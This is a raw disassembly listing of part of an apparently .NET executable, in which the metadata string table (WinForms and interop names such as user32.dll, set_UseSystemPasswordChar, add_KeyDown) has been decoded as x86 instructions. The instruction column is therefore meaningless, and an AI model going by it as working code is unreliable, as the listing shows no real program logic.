  407bda:	65 00 63 72          	add    %ah,%gs:0x72(%ebx)
  407bde:	65 64 75 69          	gs fs jne 0x407c4b
  407be2:	00 53 74             	add    %dl,0x74(%ebx)
  407be5:	72 69                	jb     0x407c50
  407be7:	6e                   	outsb  %ds:(%esi),(%dx)
  407be8:	67 00 49 73          	add    %cl,0x73(%bx,%di)
  407bec:	4e                   	dec    %esi
  407bed:	75 6c                	jne    0x407c5b
  407bef:	6c                   	insb   (%dx),%es:(%edi)
  407bf0:	4f                   	dec    %edi
  407bf1:	72 45                	jb     0x407c38
  407bf3:	6d                   	insl   (%dx),%es:(%edi)
  407bf4:	70 74                	jo     0x407c6a
  407bf6:	79 00                	jns    0x407bf8
  407bf8:	4d                   	dec    %ebp
  407bf9:	61                   	popa
  407bfa:	72 73                	jb     0x407c6f
  407bfc:	68 61 6c 00 53       	push   $0x53006c61
  407c01:	69 7a 65 4f 66 00 49 	imul   $0x4900664f,0x65(%edx),%edi
  407c08:	6e                   	outsb  %ds:(%esi),(%dx)
  407c09:	74 50                	je     0x407c5b
  407c0b:	74 72                	je     0x407c7f
  407c0d:	00 5a 65             	add    %bl,0x65(%edx)
  407c10:	72 6f                	jb     0x407c81
  407c12:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  407c16:	74 72                	je     0x407c8a
  407c18:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  407c1f:	75 63                	jne    0x407c84
  407c21:	74 4c                	je     0x407c6f
  407c23:	61                   	popa
  407c24:	79 6f                	jns    0x407c95
  407c26:	75 74                	jne    0x407c9c
  407c28:	41                   	inc    %ecx
  407c29:	74 74                	je     0x407c9f
  407c2b:	72 69                	jb     0x407c96
  407c2d:	62 75 74             	bound  %esi,0x74(%ebp)
  407c30:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  407c35:	6f                   	outsl  %ds:(%esi),(%dx)
  407c36:	75 74                	jne    0x407cac
  407c38:	4b                   	dec    %ebx
  407c39:	69 6e 64 00 46 6c 61 	imul   $0x616c4600,0x64(%esi),%ebp
  407c40:	67 73 41             	addr16 jae 0x407c84
  407c43:	74 74                	je     0x407cb9
  407c45:	72 69                	jb     0x407cb0
  407c47:	62 75 74             	bound  %esi,0x74(%ebp)
  407c4a:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  407c4e:	70 74                	jo     0x407cc4
  407c50:	79 00                	jns    0x407c52
  407c52:	43                   	inc    %ebx
  407c53:	6c                   	insb   (%dx),%es:(%edi)
  407c54:	6f                   	outsl  %ds:(%esi),(%dx)
  407c55:	73 65                	jae    0x407cbc
  407c57:	00 73 65             	add    %dh,0x65(%ebx)
  407c5a:	74 5f                	je     0x407cbb
  407c5c:	4f                   	dec    %edi
  407c5d:	70 61                	jo     0x407cc0
  407c5f:	63 69 74             	arpl   %ebp,0x74(%ecx)
  407c62:	79 00                	jns    0x407c64
  407c64:	73 65                	jae    0x407ccb
  407c66:	74 5f                	je     0x407cc7
  407c68:	53                   	push   %ebx
  407c69:	68 6f 77 49 6e       	push   $0x6e49776f
  407c6e:	54                   	push   %esp
  407c6f:	61                   	popa
  407c70:	73 6b                	jae    0x407cdd
  407c72:	62 61 72             	bound  %esp,0x72(%ecx)
  407c75:	00 43 6f             	add    %al,0x6f(%ebx)
  407c78:	6e                   	outsb  %ds:(%esi),(%dx)
  407c79:	74 72                	je     0x407ced
  407c7b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c7c:	6c                   	insb   (%dx),%es:(%edi)
  407c7d:	00 73 65             	add    %dh,0x65(%ebx)
  407c80:	74 5f                	je     0x407ce1
  407c82:	56                   	push   %esi
  407c83:	69 73 69 62 6c 65 00 	imul   $0x656c62,0x69(%ebx),%esi
  407c8a:	67 65 74 5f          	addr16 gs je 0x407ced
  407c8e:	42                   	inc    %edx
  407c8f:	6f                   	outsl  %ds:(%esi),(%dx)
  407c90:	74 74                	je     0x407d06
  407c92:	6f                   	outsl  %ds:(%esi),(%dx)
  407c93:	6d                   	insl   (%dx),%es:(%edi)
  407c94:	00 67 65             	add    %ah,0x65(%edi)
  407c97:	74 5f                	je     0x407cf8
  407c99:	54                   	push   %esp
  407c9a:	6f                   	outsl  %ds:(%esi),(%dx)
  407c9b:	70 00                	jo     0x407c9d
  407c9d:	67 65 74 5f          	addr16 gs je 0x407d00
  407ca1:	52                   	push   %edx
  407ca2:	69 67 68 74 00 67 65 	imul   $0x65670074,0x68(%edi),%esp
  407ca9:	74 5f                	je     0x407d0a
  407cab:	4c                   	dec    %esp
  407cac:	65 66 74 00          	gs data16 je 0x407cb0
  407cb0:	41                   	inc    %ecx
  407cb1:	64 64 72 65          	fs fs jb 0x407d1a
  407cb5:	73 73                	jae    0x407d2a
  407cb7:	00 42 75             	add    %al,0x75(%edx)
  407cba:	66 66 65 72 43       	data16 data16 gs jb 0x407d02
  407cbf:	65 6c                	gs insb (%dx),%es:(%edi)
  407cc1:	6c                   	insb   (%dx),%es:(%edi)
  407cc2:	54                   	push   %esp
  407cc3:	79 70                	jns    0x407d35
  407cc5:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407cc9:	74 5f                	je     0x407d2a
  407ccb:	58                   	pop    %eax
  407ccc:	00 73 65             	add    %dh,0x65(%ebx)
  407ccf:	74 5f                	je     0x407d30
  407cd1:	59                   	pop    %ecx
  407cd2:	00 73 65             	add    %dh,0x65(%ebx)
  407cd5:	74 5f                	je     0x407d36
  407cd7:	48                   	dec    %eax
  407cd8:	65 69 67 68 74 00 73 	imul   $0x65730074,%gs:0x68(%edi),%esp
  407cdf:	65 
  407ce0:	74 5f                	je     0x407d41
  407ce2:	57                   	push   %edi
  407ce3:	69 64 74 68 00 41 70 	imul   $0x70704100,0x68(%esp,%esi,2),%esp
  407cea:	70 
  407ceb:	44                   	inc    %esp
  407cec:	6f                   	outsl  %ds:(%esi),(%dx)
  407ced:	6d                   	insl   (%dx),%es:(%edi)
  407cee:	61                   	popa
  407cef:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  407cf6:	43                   	inc    %ebx
  407cf7:	75 72                	jne    0x407d6b
  407cf9:	72 65                	jb     0x407d60
  407cfb:	6e                   	outsb  %ds:(%esi),(%dx)
  407cfc:	74 44                	je     0x407d42
  407cfe:	6f                   	outsl  %ds:(%esi),(%dx)
  407cff:	6d                   	insl   (%dx),%es:(%edi)
  407d00:	61                   	popa
  407d01:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  407d08:	46                   	inc    %esi
  407d09:	72 69                	jb     0x407d74
  407d0b:	65 6e                	outsb  %gs:(%esi),(%dx)
  407d0d:	64 6c                	fs insb (%dx),%es:(%edi)
  407d0f:	79 4e                	jns    0x407d5f
  407d11:	61                   	popa
  407d12:	6d                   	insl   (%dx),%es:(%edi)
  407d13:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  407d17:	65 72 33             	gs jb  0x407d4d
  407d1a:	32 2e                	xor    (%esi),%ch
  407d1c:	64 6c                	fs insb (%dx),%es:(%edi)
  407d1e:	6c                   	insb   (%dx),%es:(%edi)
  407d1f:	00 53 69             	add    %dl,0x69(%ebx)
  407d22:	7a 65                	jp     0x407d89
  407d24:	46                   	inc    %esi
  407d25:	00 43 6f             	add    %al,0x6f(%ebx)
  407d28:	6e                   	outsb  %ds:(%esi),(%dx)
  407d29:	74 61                	je     0x407d8c
  407d2b:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%esi),%ebp
  407d32:	74 72                	je     0x407da6
  407d34:	6f                   	outsl  %ds:(%esi),(%dx)
  407d35:	6c                   	insb   (%dx),%es:(%edi)
  407d36:	00 73 65             	add    %dh,0x65(%ebx)
  407d39:	74 5f                	je     0x407d9a
  407d3b:	41                   	inc    %ecx
  407d3c:	75 74                	jne    0x407db2
  407d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3f:	53                   	push   %ebx
  407d40:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407d43:	65 44                	gs inc %esp
  407d45:	69 6d 65 6e 73 69 6f 	imul   $0x6f69736e,0x65(%ebp),%ebp
  407d4c:	6e                   	outsb  %ds:(%esi),(%dx)
  407d4d:	73 00                	jae    0x407d4f
  407d4f:	41                   	inc    %ecx
  407d50:	75 74                	jne    0x407dc6
  407d52:	6f                   	outsl  %ds:(%esi),(%dx)
  407d53:	53                   	push   %ebx
  407d54:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407d57:	65 4d                	gs dec %ebp
  407d59:	6f                   	outsl  %ds:(%esi),(%dx)
  407d5a:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  407d5f:	74 5f                	je     0x407dc0
  407d61:	41                   	inc    %ecx
  407d62:	75 74                	jne    0x407dd8
  407d64:	6f                   	outsl  %ds:(%esi),(%dx)
  407d65:	53                   	push   %ebx
  407d66:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407d69:	65 4d                	gs dec %ebp
  407d6b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d6c:	64 65 00 54 65 78    	fs add %dl,%gs:0x78(%ebp,%eiz,2)
  407d72:	74 42                	je     0x407db6
  407d74:	6f                   	outsl  %ds:(%esi),(%dx)
  407d75:	78 00                	js     0x407d77
  407d77:	42                   	inc    %edx
  407d78:	75 74                	jne    0x407dee
  407d7a:	74 6f                	je     0x407deb
  407d7c:	6e                   	outsb  %ds:(%esi),(%dx)
  407d7d:	00 73 65             	add    %dh,0x65(%ebx)
  407d80:	74 5f                	je     0x407de1
  407d82:	54                   	push   %esp
  407d83:	65 78 74             	gs js  0x407dfa
  407d86:	00 50 6f             	add    %dl,0x6f(%eax)
  407d89:	69 6e 74 00 73 65 74 	imul   $0x74657300,0x74(%esi),%ebp
  407d90:	5f                   	pop    %edi
  407d91:	4c                   	dec    %esp
  407d92:	6f                   	outsl  %ds:(%esi),(%dx)
  407d93:	63 61 74             	arpl   %esp,0x74(%ecx)
  407d96:	69 6f 6e 00 53 63 72 	imul   $0x72635300,0x6e(%edi),%ebp
  407d9d:	65 65 6e             	gs outsb %gs:(%esi),(%dx)
  407da0:	00 46 72             	add    %al,0x72(%esi)
  407da3:	6f                   	outsl  %ds:(%esi),(%dx)
  407da4:	6d                   	insl   (%dx),%es:(%edi)
  407da5:	43                   	inc    %ebx
  407da6:	6f                   	outsl  %ds:(%esi),(%dx)
  407da7:	6e                   	outsb  %ds:(%esi),(%dx)
  407da8:	74 72                	je     0x407e1c
  407daa:	6f                   	outsl  %ds:(%esi),(%dx)
  407dab:	6c                   	insb   (%dx),%es:(%edi)
  407dac:	00 67 65             	add    %ah,0x65(%edi)
  407daf:	74 5f                	je     0x407e10
  407db1:	42                   	inc    %edx
  407db2:	6f                   	outsl  %ds:(%esi),(%dx)
  407db3:	75 6e                	jne    0x407e23
  407db5:	64 73 00             	fs jae 0x407db8
  407db8:	67 65 74 5f          	addr16 gs je 0x407e1b
  407dbc:	57                   	push   %edi
  407dbd:	69 64 74 68 00 73 65 	imul   $0x74657300,0x68(%esp,%esi,2),%esp
  407dc4:	74 
  407dc5:	5f                   	pop    %edi
  407dc6:	4d                   	dec    %ebp
  407dc7:	61                   	popa
  407dc8:	78 69                	js     0x407e33
  407dca:	6d                   	insl   (%dx),%es:(%edi)
  407dcb:	75 6d                	jne    0x407e3a
  407dcd:	53                   	push   %ebx
  407dce:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407dd5:	5f                   	pop    %edi
  407dd6:	41                   	inc    %ecx
  407dd7:	75 74                	jne    0x407e4d
  407dd9:	6f                   	outsl  %ds:(%esi),(%dx)
  407dda:	53                   	push   %ebx
  407ddb:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  407de2:	74 72                	je     0x407e56
  407de4:	6f                   	outsl  %ds:(%esi),(%dx)
  407de5:	6c                   	insb   (%dx),%es:(%edi)
  407de6:	43                   	inc    %ebx
  407de7:	6f                   	outsl  %ds:(%esi),(%dx)
  407de8:	6c                   	insb   (%dx),%es:(%edi)
  407de9:	6c                   	insb   (%dx),%es:(%edi)
  407dea:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407def:	6e                   	outsb  %ds:(%esi),(%dx)
  407df0:	00 67 65             	add    %ah,0x65(%edi)
  407df3:	74 5f                	je     0x407e54
  407df5:	43                   	inc    %ebx
  407df6:	6f                   	outsl  %ds:(%esi),(%dx)
  407df7:	6e                   	outsb  %ds:(%esi),(%dx)
  407df8:	74 72                	je     0x407e6c
  407dfa:	6f                   	outsl  %ds:(%esi),(%dx)
  407dfb:	6c                   	insb   (%dx),%es:(%edi)
  407dfc:	73 00                	jae    0x407dfe
  407dfe:	41                   	inc    %ecx
  407dff:	64 64 00 73 65       	fs add %dh,%fs:0x65(%ebx)
  407e04:	74 5f                	je     0x407e65
  407e06:	55                   	push   %ebp
  407e07:	73 65                	jae    0x407e6e
  407e09:	53                   	push   %ebx
  407e0a:	79 73                	jns    0x407e7f
  407e0c:	74 65                	je     0x407e73
  407e0e:	6d                   	insl   (%dx),%es:(%edi)
  407e0f:	50                   	push   %eax
  407e10:	61                   	popa
  407e11:	73 73                	jae    0x407e86
  407e13:	77 6f                	ja     0x407e84
  407e15:	72 64                	jb     0x407e7b
  407e17:	43                   	inc    %ebx
  407e18:	68 61 72 00 53       	push   $0x53007261
  407e1d:	65 74 42             	gs je  0x407e62
  407e20:	6f                   	outsl  %ds:(%esi),(%dx)
  407e21:	75 6e                	jne    0x407e91
  407e23:	64 73 00             	fs jae 0x407e26
  407e26:	50                   	push   %eax
  407e27:	74 72                	je     0x407e9b
  407e29:	54                   	push   %esp
  407e2a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e2b:	53                   	push   %ebx
  407e2c:	74 72                	je     0x407ea0
  407e2e:	69 6e 67 55 6e 69 00 	imul   $0x696e55,0x67(%esi),%ebp
  407e35:	73 65                	jae    0x407e9c
  407e37:	74 5f                	je     0x407e98
  407e39:	44                   	inc    %esp
  407e3a:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  407e41:	73 75                	jae    0x407eb8
  407e43:	6c                   	insb   (%dx),%es:(%edi)
  407e44:	74 00                	je     0x407e46
  407e46:	4d                   	dec    %ebp
  407e47:	61                   	popa
  407e48:	74 68                	je     0x407eb2
  407e4a:	00 4d 61             	add    %cl,0x61(%ebp)
  407e4d:	78 00                	js     0x407e4f
  407e4f:	73 65                	jae    0x407eb6
  407e51:	74 5f                	je     0x407eb2
  407e53:	43                   	inc    %ebx
  407e54:	6c                   	insb   (%dx),%es:(%edi)
  407e55:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%ebp),%esp
  407e5c:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  407e60:	64 52                	fs push %edx
  407e62:	61                   	popa
  407e63:	6e                   	outsb  %ds:(%esi),(%dx)
  407e64:	67 65 00 46 6f       	add    %al,%gs:0x6f(%bp)
  407e69:	72 6d                	jb     0x407ed8
  407e6b:	42                   	inc    %edx
  407e6c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e6d:	72 64                	jb     0x407ed3
  407e6f:	65 72 53             	gs jb  0x407ec5
  407e72:	74 79                	je     0x407eed
  407e74:	6c                   	insb   (%dx),%es:(%edi)
  407e75:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407e79:	74 5f                	je     0x407eda
  407e7b:	46                   	inc    %esi
  407e7c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e7d:	72 6d                	jb     0x407eec
  407e7f:	42                   	inc    %edx
  407e80:	6f                   	outsl  %ds:(%esi),(%dx)
  407e81:	72 64                	jb     0x407ee7
  407e83:	65 72 53             	gs jb  0x407ed9
  407e86:	74 79                	je     0x407f01
  407e88:	6c                   	insb   (%dx),%es:(%edi)
  407e89:	65 00 46 6f          	add    %al,%gs:0x6f(%esi)
  407e8d:	72 6d                	jb     0x407efc
  407e8f:	53                   	push   %ebx
  407e90:	74 61                	je     0x407ef3
  407e92:	72 74                	jb     0x407f08
  407e94:	50                   	push   %eax
  407e95:	6f                   	outsl  %ds:(%esi),(%dx)
  407e96:	73 69                	jae    0x407f01
  407e98:	74 69                	je     0x407f03
  407e9a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e9c:	00 73 65             	add    %dh,0x65(%ebx)
  407e9f:	74 5f                	je     0x407f00
  407ea1:	53                   	push   %ebx
  407ea2:	74 61                	je     0x407f05
  407ea4:	72 74                	jb     0x407f1a
  407ea6:	50                   	push   %eax
  407ea7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea8:	73 69                	jae    0x407f13
  407eaa:	74 69                	je     0x407f15
  407eac:	6f                   	outsl  %ds:(%esi),(%dx)
  407ead:	6e                   	outsb  %ds:(%esi),(%dx)
  407eae:	00 41 73             	add    %al,0x73(%ecx)
  407eb1:	73 65                	jae    0x407f18
  407eb3:	6d                   	insl   (%dx),%es:(%edi)
  407eb4:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  407eb8:	47                   	inc    %edi
  407eb9:	65 74 45             	gs je  0x407f01
  407ebc:	78 65                	js     0x407f23
  407ebe:	63 75 74             	arpl   %esi,0x74(%ebp)
  407ec1:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  407ec8:	6d                   	insl   (%dx),%es:(%edi)
  407ec9:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  407ecd:	67 65 74 5f          	addr16 gs je 0x407f30
  407ed1:	4c                   	dec    %esp
  407ed2:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed3:	63 61 74             	arpl   %esp,0x74(%ecx)
  407ed6:	69 6f 6e 00 49 63 6f 	imul   $0x6f634900,0x6e(%edi),%ebp
  407edd:	6e                   	outsb  %ds:(%esi),(%dx)
  407ede:	00 45 78             	add    %al,0x78(%ebp)
  407ee1:	74 72                	je     0x407f55
  407ee3:	61                   	popa
  407ee4:	63 74 41 73          	arpl   %esi,0x73(%ecx,%eax,2)
  407ee8:	73 6f                	jae    0x407f59
  407eea:	63 69 61             	arpl   %ebp,0x61(%ecx)
  407eed:	74 65                	je     0x407f54
  407eef:	64 49                	fs dec %ecx
  407ef1:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  407ef4:	00 73 65             	add    %dh,0x65(%ebx)
  407ef7:	74 5f                	je     0x407f58
  407ef9:	49                   	dec    %ecx
  407efa:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  407efd:	00 73 65             	add    %dh,0x65(%ebx)
  407f00:	74 5f                	je     0x407f61
  407f02:	4d                   	dec    %ebp
  407f03:	69 6e 69 6d 69 7a 65 	imul   $0x657a696d,0x69(%esi),%ebp
  407f0a:	42                   	inc    %edx
  407f0b:	6f                   	outsl  %ds:(%esi),(%dx)
  407f0c:	78 00                	js     0x407f0e
  407f0e:	73 65                	jae    0x407f75
  407f10:	74 5f                	je     0x407f71
  407f12:	4d                   	dec    %ebp
  407f13:	61                   	popa
  407f14:	78 69                	js     0x407f7f
  407f16:	6d                   	insl   (%dx),%es:(%edi)
  407f17:	69 7a 65 42 6f 78 00 	imul   $0x786f42,0x65(%edx),%edi
  407f1e:	49                   	dec    %ecx
  407f1f:	42                   	inc    %edx
  407f20:	75 74                	jne    0x407f96
  407f22:	74 6f                	je     0x407f93
  407f24:	6e                   	outsb  %ds:(%esi),(%dx)
  407f25:	43                   	inc    %ebx
  407f26:	6f                   	outsl  %ds:(%esi),(%dx)
  407f27:	6e                   	outsb  %ds:(%esi),(%dx)
  407f28:	74 72                	je     0x407f9c
  407f2a:	6f                   	outsl  %ds:(%esi),(%dx)
  407f2b:	6c                   	insb   (%dx),%es:(%edi)
  407f2c:	00 73 65             	add    %dh,0x65(%ebx)
  407f2f:	74 5f                	je     0x407f90
  407f31:	41                   	inc    %ecx
  407f32:	63 63 65             	arpl   %esp,0x65(%ebx)
  407f35:	70 74                	jo     0x407fab
  407f37:	42                   	inc    %edx
  407f38:	75 74                	jne    0x407fae
  407f3a:	74 6f                	je     0x407fab
  407f3c:	6e                   	outsb  %ds:(%esi),(%dx)
  407f3d:	00 73 65             	add    %dh,0x65(%ebx)
  407f40:	74 5f                	je     0x407fa1
  407f42:	43                   	inc    %ebx
  407f43:	61                   	popa
  407f44:	6e                   	outsb  %ds:(%esi),(%dx)
  407f45:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  407f48:	42                   	inc    %edx
  407f49:	75 74                	jne    0x407fbf
  407f4b:	74 6f                	je     0x407fbc
  407f4d:	6e                   	outsb  %ds:(%esi),(%dx)
  407f4e:	00 53 68             	add    %dl,0x68(%ebx)
  407f51:	6f                   	outsl  %ds:(%esi),(%dx)
  407f52:	77 44                	ja     0x407f98
  407f54:	69 61 6c 6f 67 00 67 	imul   $0x6700676f,0x6c(%ecx),%esp
  407f5b:	65 74 5f             	gs je  0x407fbd
  407f5e:	54                   	push   %esp
  407f5f:	65 78 74             	gs js  0x407fd6
  407f62:	00 67 65             	add    %ah,0x65(%edi)
  407f65:	74 5f                	je     0x407fc6
  407f67:	43                   	inc    %ebx
  407f68:	6f                   	outsl  %ds:(%esi),(%dx)
  407f69:	75 6e                	jne    0x407fd9
  407f6b:	74 00                	je     0x407f6d
  407f6d:	52                   	push   %edx
  407f6e:	61                   	popa
  407f6f:	64 69 6f 42 75 74 74 	imul   $0x6f747475,%fs:0x42(%edi),%ebp
  407f76:	6f 
  407f77:	6e                   	outsb  %ds:(%esi),(%dx)
  407f78:	00 54 6f 6f          	add    %dl,0x6f(%edi,%ebp,2)
  407f7c:	6c                   	insb   (%dx),%es:(%edi)
  407f7d:	54                   	push   %esp
  407f7e:	69 70 00 49 45 6e 75 	imul   $0x756e4549,0x0(%eax),%esi
  407f85:	6d                   	insl   (%dx),%es:(%edi)
  407f86:	65 72 61             	gs jb  0x407fea
  407f89:	74 6f                	je     0x407ffa
  407f8b:	72 60                	jb     0x407fed
  407f8d:	31 00                	xor    %eax,(%eax)
  407f8f:	47                   	inc    %edi
  407f90:	65 74 45             	gs je  0x407fd8
  407f93:	6e                   	outsb  %ds:(%esi),(%dx)
  407f94:	75 6d                	jne    0x408003
  407f96:	65 72 61             	gs jb  0x407ffa
  407f99:	74 6f                	je     0x40800a
  407f9b:	72 00                	jb     0x407f9d
  407f9d:	67 65 74 5f          	addr16 gs je 0x408000
  407fa1:	43                   	inc    %ebx
  407fa2:	75 72                	jne    0x408016
  407fa4:	72 65                	jb     0x40800b
  407fa6:	6e                   	outsb  %ds:(%esi),(%dx)
  407fa7:	74 00                	je     0x407fa9
  407fa9:	67 65 74 5f          	addr16 gs je 0x40800c
  407fad:	4c                   	dec    %esp
  407fae:	61                   	popa
  407faf:	62 65 6c             	bound  %esp,0x6c(%ebp)
  407fb2:	00 73 65             	add    %dh,0x65(%ebx)
  407fb5:	74 5f                	je     0x408016
  407fb7:	43                   	inc    %ebx
  407fb8:	68 65 63 6b 65       	push   $0x656b6365
  407fbd:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407fc1:	74 5f                	je     0x408022
  407fc3:	48                   	dec    %eax
  407fc4:	65 69 67 68 74 00 67 	imul   $0x65670074,%gs:0x68(%edi),%esp
  407fcb:	65 
  407fcc:	74 5f                	je     0x40802d
  407fce:	48                   	dec    %eax
  407fcf:	65 6c                	gs insb (%dx),%es:(%edi)
  407fd1:	70 4d                	jo     0x408020
  407fd3:	65 73 73             	gs jae 0x408049
  407fd6:	61                   	popa
  407fd7:	67 65 00 53 65       	add    %dl,%gs:0x65(%bp,%di)
  407fdc:	74 54                	je     0x408032
  407fde:	6f                   	outsl  %ds:(%esi),(%dx)
  407fdf:	6f                   	outsl  %ds:(%esi),(%dx)
  407fe0:	6c                   	insb   (%dx),%es:(%edi)
  407fe1:	54                   	push   %esp
  407fe2:	69 70 00 53 79 73 74 	imul   $0x74737953,0x0(%eax),%esi
  407fe9:	65 6d                	gs insl (%dx),%es:(%edi)
  407feb:	2e 43                	cs inc %ebx
  407fed:	6f                   	outsl  %ds:(%esi),(%dx)
  407fee:	6c                   	insb   (%dx),%es:(%edi)
  407fef:	6c                   	insb   (%dx),%es:(%edi)
  407ff0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407ff5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff6:	73 00                	jae    0x407ff8
  407ff8:	49                   	dec    %ecx
  407ff9:	45                   	inc    %ebp
  407ffa:	6e                   	outsb  %ds:(%esi),(%dx)
  407ffb:	75 6d                	jne    0x40806a
  407ffd:	65 72 61             	gs jb  0x408061
  408000:	74 6f                	je     0x408071
  408002:	72 00                	jb     0x408004
  408004:	4d                   	dec    %ebp
  408005:	6f                   	outsl  %ds:(%esi),(%dx)
  408006:	76 65                	jbe    0x40806d
  408008:	4e                   	dec    %esi
  408009:	65 78 74             	gs js  0x408080
  40800c:	00 49 44             	add    %cl,0x44(%ecx)
  40800f:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408016:	6c                   	insb   (%dx),%es:(%edi)
  408017:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  40801c:	70 6f                	jo     0x40808d
  40801e:	73 65                	jae    0x408085
  408020:	00 73 65             	add    %dh,0x65(%ebx)
  408023:	74 5f                	je     0x408084
  408025:	53                   	push   %ebx
  408026:	68 6f 77 41 6c       	push   $0x6c41776f
  40802b:	77 61                	ja     0x40808e
  40802d:	79 73                	jns    0x4080a2
  40802f:	00 67 65             	add    %ah,0x65(%edi)
  408032:	74 5f                	je     0x408093
  408034:	43                   	inc    %ebx
  408035:	68 65 63 6b 65       	push   $0x656b6365
  40803a:	64 00 42 79          	add    %al,%fs:0x79(%edx)
  40803e:	74 65                	je     0x4080a5
  408040:	00 4b 65             	add    %cl,0x65(%ebx)
  408043:	79 45                	jns    0x40808a
  408045:	76 65                	jbe    0x4080ac
  408047:	6e                   	outsb  %ds:(%esi),(%dx)
  408048:	74 48                	je     0x408092
  40804a:	61                   	popa
  40804b:	6e                   	outsb  %ds:(%esi),(%dx)
  40804c:	64 6c                	fs insb (%dx),%es:(%edi)
  40804e:	65 72 00             	gs jb  0x408051
  408051:	61                   	popa
  408052:	64 64 5f             	fs fs pop %edi
  408055:	4b                   	dec    %ebx
  408056:	65 79 44             	gs jns 0x40809d
  408059:	6f                   	outsl  %ds:(%esi),(%dx)
  40805a:	77 6e                	ja     0x4080ca
  40805c:	00 61 64             	add    %ah,0x64(%ecx)
  40805f:	64 5f                	fs pop %edi
  408061:	4b                   	dec    %ebx
  408062:	65 79 55             	gs jns 0x4080ba
  408065:	70 00                	jo     0x408067
  408067:	67 65 74 5f          	addr16 gs je 0x4080ca
  40806b:	4b                   	dec    %ebx
  40806c:	65 79 56             	gs jns 0x4080c5
  40806f:	61                   	popa
  408070:	6c                   	insb   (%dx),%es:(%edi)
  408071:	75 65                	jne    0x4080d8
  408073:	00 73 65             	add    %dh,0x65(%ebx)
  408076:	74 5f                	je     0x4080d7
  408078:	56                   	push   %esi
  408079:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  408080:	65 79 43             	gs jns 0x4080c6
  408083:	6f                   	outsl  %ds:(%esi),(%dx)
  408084:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408089:	74 5f                	je     0x4080ea
  40808b:	4b                   	dec    %ebx
  40808c:	65 79 43             	gs jns 0x4080d2
  40808f:	6f                   	outsl  %ds:(%esi),(%dx)
  408090:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408095:	74 5f                	je     0x4080f6
  408097:	53                   	push   %ebx
  408098:	68 69 66 74 00       	push   $0x746669
  40809d:	67 65 74 5f          	addr16 gs je 0x408100
  4080a1:	41                   	inc    %ecx
  4080a2:	6c                   	insb   (%dx),%es:(%edi)
  4080a3:	74 00                	je     0x4080a5
  4080a5:	67 65 74 5f          	addr16 gs je 0x408108
  4080a9:	43                   	inc    %ebx
  4080aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4080ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ac:	74 72                	je     0x408120
  4080ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4080af:	6c                   	insb   (%dx),%es:(%edi)
  4080b0:	00 67 65             	add    %ah,0x65(%edi)
  4080b3:	74 5f                	je     0x408114
  4080b5:	43                   	inc    %ebx
  4080b6:	68 61 72 73 00       	push   $0x737261
  4080bb:	73 65                	jae    0x408122
  4080bd:	74 5f                	je     0x40811e
  4080bf:	43                   	inc    %ebx
  4080c0:	68 61 72 61 63       	push   $0x63617261
  4080c5:	74 65                	je     0x40812c
  4080c7:	72 00                	jb     0x4080c9
  4080c9:	73 65                	jae    0x408130
  4080cb:	74 5f                	je     0x40812c
  4080cd:	4b                   	dec    %ebx
  4080ce:	65 79 44             	gs jns 0x408115
  4080d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4080d2:	77 6e                	ja     0x408142
  4080d4:	00 43 6f             	add    %al,0x6f(%ebx)
  4080d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4080d8:	74 72                	je     0x40814c
  4080da:	6f                   	outsl  %ds:(%esi),(%dx)
  4080db:	6c                   	insb   (%dx),%es:(%edi)
  4080dc:	4b                   	dec    %ebx
  4080dd:	65 79 53             	gs jns 0x408133
  4080e0:	74 61                	je     0x408143
  4080e2:	74 65                	je     0x408149
  4080e4:	73 00                	jae    0x4080e6
  4080e6:	73 65                	jae    0x40814d
